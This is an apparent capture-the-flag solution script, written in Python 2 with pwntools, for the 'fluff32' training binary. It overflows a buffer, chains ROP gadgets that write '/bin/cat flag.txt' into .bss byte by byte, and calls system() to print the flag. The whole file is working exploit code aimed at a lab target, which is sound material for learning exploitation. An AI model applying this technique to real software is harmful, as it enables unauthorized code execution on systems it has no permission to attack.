from pwn import *

inc_ecx_addr = 0x080488ba
pop_ebx_addr = 0x080483e1
pop_ebx_xor_ecx_bl_addr = 0x08048696
xor_edx_ebx_pop_esi_addr = 0x0804867b
mov_edx_defaced0_addr = 0x0804868c
xchg_edx_ecx_pop_ebp_addr = 0x08048689

def set_ecx_addr(addr):
    rop = ''
    rop += p32(mov_edx_defaced0_addr)
    rop += p32(pop_ebx_addr)
    rop += p32(addr ^ 0xdefaced0)
    rop += p32(xor_edx_ebx_pop_esi_addr)
    rop += 'JUNK'
    rop += p32(xchg_edx_ecx_pop_ebp_addr)
    rop += 'JUNK'
    return rop

def xor_into_ecx(value):
    rop = ''
    rop += p32(pop_ebx_xor_ecx_bl_addr)
    rop += p32(value)
    return rop

def inc_ecx():
    rop = ''
    rop += p32(inc_ecx_addr)
    return rop

# context.log_level = 'DEBUG'

filename = './fluff32'

padding = 'A' * 44

elf = ELF(filename)

system_addr = elf.symbols.system
bss_addr = elf.bss(4)

payload = padding

# Load bss_addr into ecx
payload += set_ecx_addr(bss_addr)

# Move '/bin/cat flag.txt' into bss_addr
command = '/bin/cat flag.txt'
for value in map(ord, command):
    payload += xor_into_ecx(value)
    payload += inc_ecx()

# Execute system(&'/bin/cat flag.txt')
payload += p32(system_addr)
payload += 'JUNK'
payload += p32(bss_addr)

p = process(filename)

"""
gdb.attach(p, '''
        b *0x0804864b
        continue
        ''')
"""

p.recvuntil('> ')
p.sendline(payload)

print "Flag:", p.recv(1024)

